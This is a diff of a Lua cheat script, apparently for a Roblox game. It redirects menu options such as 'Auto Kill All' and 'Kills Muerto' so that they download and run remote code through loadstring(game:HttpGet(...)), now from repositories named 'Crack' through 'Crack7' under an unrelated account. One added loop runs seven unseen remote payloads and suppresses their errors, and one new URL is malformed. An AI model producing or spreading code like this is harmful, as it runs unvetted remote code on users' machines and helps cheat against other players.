@@ -433,21 +433,36 @@ if name == "Tp king" then
 
        if name == "Tp jungla gym" then
                 _G.lockPosition = isActive
-                local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/PheonixHub/Tp-jungla-/refs/heads/main/Tp%20jungla", true))
+                local func = loadstring(game:HttpGet("https://Tp-jungle/TpjungleCrack", true))
                 if func then func() end
             end
 
           if name == "Protein egg" then
-              local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/CTXxALEJANDROxX/Protein-egg/refs/heads/main/Egg", true))()
+              local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/SadOz8/Egg/refs/heads/main/EggCrack", true))()
               if func then func() end
           end
 
-          if name == "Kills Muerto" then
-             local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/PheonixHub/Script-combinando-kill/refs/heads/main/Script%20para%20no%20comer%20eggs", true))()
-             if func then func() end
-         end
+         if name == "Kills Muerto" then
+    local urls = {
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack2",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack3",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack4",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack5",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs/refs/heads/main/Crack6",
+        "https://raw.githubusercontent.com/SadOz8/Stuffs-2/refs/heads/main/Crack7"
+    }
 
-       
+    for _, url in ipairs(urls) do
+        local success, func = pcall(function()
+            return loadstring(game:HttpGet(url, true))
+        end)
+        if success and func then
+            pcall(func)
+        end
+    end
+end
+  
          if name == "Golpe Sin Animacion" then
              local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/CTXxALEJANDROxX/Fast-Rebith-/refs/heads/main/Fast%20rebith", true))()
              if func then func() end
@@ -485,7 +500,7 @@ if name == "Tp king" then
 
 if name == "Auto Kill All" then
                 _G.lockPosition = isActive
-                local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/PheonixHub/Auto-kill-all-/refs/heads/main/Auto%20kill%20para%20todos", true))
+                local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/SadOz8/Stuffs-2/refs/heads/main/Crack7", true))
                 if func then func() end
             end
 
